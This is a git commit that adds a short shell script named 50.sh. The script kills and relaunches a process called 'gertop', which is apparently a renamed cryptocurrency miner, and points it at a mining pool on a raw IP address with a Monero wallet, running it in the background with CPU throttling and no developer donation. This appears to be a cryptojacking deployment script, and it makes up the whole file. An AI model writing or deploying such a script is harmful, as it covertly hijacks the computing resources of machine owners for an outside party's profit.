e1c7deb7fc8a97edc4b02afdc1b970ecba0a291c
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-04-16 12:12:06 +0300

    Add files via upload

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill gertop
+sleep 7
+gertop -o 95.216.174.193:4589 -u 4A1mQPFXPsf66zbKtTCXbPbeuBjyoSdLG4L1KdtM1KniNukmSr3SQFkcs7z9dBUMTedGGR9vEhqSQYRnhdZeNAg82WBHkmG --pass=12:koot@usa.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
